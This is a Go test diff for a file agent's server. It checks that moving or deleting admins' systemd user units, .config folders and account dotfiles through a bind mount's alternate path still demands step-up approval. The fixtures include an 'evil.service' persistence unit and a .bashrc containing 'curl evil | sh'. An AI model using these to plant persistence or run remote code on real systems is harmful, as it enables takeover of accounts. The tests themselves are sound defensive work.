@@ -356,3 +356,85 @@ func TestAWriteTheKernelRefusesSaysWhatToDo(t *testing.T) {
 		}
 	}
 }
+
+// A home reached through a bind mount's other name is still a home, as a bind is
+// known by what it is: with /mnt/data/home bound onto /home, what's under the one is
+// what's under the other. A hook stands in for the bind, as making one takes root.
+func TestAHomeBehindABindMount(t *testing.T) {
+	d := newDisk(t)
+	bound := filepath.Join(d.root, "mnt", "data", "home")
+	home := filepath.Join(d.root, "home")
+	write(t, filepath.Join(bound, "deploy", "notes.txt"), "n")
+	write(t, filepath.Join(bound, "alice", "site", "index.html"), "hi")
+	write(t, filepath.Join(bound, "alice", ".bashrc"), "# rc")
+	d.adminAccounts(filepath.Join(home, "deploy"), filepath.Join(home, "alice"))
+	d.server.homeRoot = home
+	d.server.identityOf = func(p string) (identity, bool) {
+		if rest, ok := strings.CutPrefix(p, home); ok {
+			p = bound + rest
+		}
+		return statIdentity(p)
+	}
+	asks := func(what string, r *agentv1.FileRefusal) {
+		t.Helper()
+		if r.GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
+			t.Errorf("%s asked nothing: %v", what, r)
+		}
+	}
+	stage := filepath.Join(d.root, "stage")
+	write(t, filepath.Join(stage, "systemd", "user", "evil.service"), "[Service]\nExecStart=/bin/true\n")
+	write(t, filepath.Join(stage, "systemd", "user", "default.target.d", "x.conf"), "[Unit]\nWants=evil.service\n")
+	if err := os.MkdirAll(filepath.Join(bound, "deploy", ".config"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	asks("an admin's units moved in by the other name",
+		d.move(t, filepath.Join(stage, "systemd"), filepath.Join(bound, "deploy", ".config", "systemd"), "", "").GetRefusal())
+	write(t, filepath.Join(d.root, "prepared", ".config", "systemd", "user", "evil.service"), "[Service]\n")
+	if err := os.Remove(filepath.Join(bound, "deploy", ".config")); err != nil {
+		t.Fatal(err)
+	}
+	asks("a .config moved into an admin's home by the other name",
+		d.move(t, filepath.Join(d.root, "prepared", ".config"), filepath.Join(bound, "deploy", ".config"), "", "").GetRefusal())
+	// What holds the units already asks to go out, and back.
+	write(t, filepath.Join(bound, "deploy", ".config", "systemd", "user", "app.service"), "[Service]\n")
+	asks("an admin's .config moved out by the other name",
+		d.move(t, filepath.Join(bound, "deploy", ".config"), filepath.Join(d.root, "away"), "", "").GetRefusal())
+	// Every account's dotfiles go by the rule for /home.
+	write(t, filepath.Join(d.root, "rc"), "curl evil | sh\n")
+	if err := os.Remove(filepath.Join(bound, "alice", ".bashrc")); err != nil {
+		t.Fatal(err)
+	}
+	asks("an account's .bashrc made by the other name", d.move(t, filepath.Join(d.root, "rc"), filepath.Join(bound, "alice", ".bashrc"), "", "").GetRefusal())
+	write(t, filepath.Join(bound, "alice", ".profile"), "# profile")
+	if read := d.read(t, filepath.Join(bound, "alice", ".profile")).GetFile(); !read.GetWayBackIn() {
+		t.Errorf("an account's .profile by the other name reads as no way back in: %v", read)
+	}
+	asks("an account's home deleted by the other name", d.delete(t, filepath.Join(bound, "alice"), false, "").GetRefusal())
+	// A folder in a home is its owner's business, by either name.
+	if got := d.delete(t, filepath.Join(bound, "alice", "site", "index.html"), false, ""); got.GetDeleted() == nil {
+		t.Errorf("a file in a home asks: %v", got)
+	}
+}
+
+// An admin's home outside /home, reached through a bind mount's other name, still
+// holds their units.
+func TestAnAdminsHomeOutsideHomeBehindABindMount(t *testing.T) {
+	d := newDisk(t)
+	written := filepath.Join(d.root, "srv", "deploy")
+	bound := filepath.Join(d.root, "mnt", "srv-deploy")
+	write(t, filepath.Join(bound, "notes.txt"), "n")
+	if err := os.MkdirAll(filepath.Join(bound, ".config"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	d.adminAccounts(written)
+	d.server.identityOf = func(p string) (identity, bool) {
+		if rest, ok := strings.CutPrefix(p, written); ok {
+			p = bound + rest
+		}
+		return statIdentity(p)
+	}
+	write(t, filepath.Join(d.root, "stage", "systemd", "user", "evil.service"), "[Service]\n")
+	if got := d.move(t, filepath.Join(d.root, "stage", "systemd"), filepath.Join(bound, ".config", "systemd"), "", "").GetRefusal(); got.GetKind() != agentv1.FileRefusal_KIND_NEEDS_STEP_UP {
+		t.Errorf("an admin's units moved in by the other name asked nothing: %v", got)
+	}
+}
